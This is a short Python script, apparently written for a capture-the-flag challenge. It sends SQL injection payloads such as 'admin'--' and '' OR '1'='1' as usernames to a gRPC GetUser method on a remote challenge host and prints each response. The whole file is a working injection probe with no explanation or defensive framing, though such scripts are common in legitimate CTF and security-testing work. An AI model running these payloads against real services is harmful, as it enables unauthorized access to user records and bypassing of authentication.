import grpc
import user_pb2, user_pb2_grpc

channel = grpc.insecure_channel('chal.78727867.xyz:14514')
stub = user_pb2_grpc.UserServiceStub(channel)

payloads = [
    "admin",
    "admin'--",
    "admin' OR '1'='1",
    "' OR '1'='1"
]

for p in payloads:
    try:
        response = stub.GetUser(user_pb2.UserRequest(username=p))
        print(f"Payload: {p} => Response: {response.data}")
    except grpc.RpcError as e:
        print(f"Error with payload {p}: {e}")

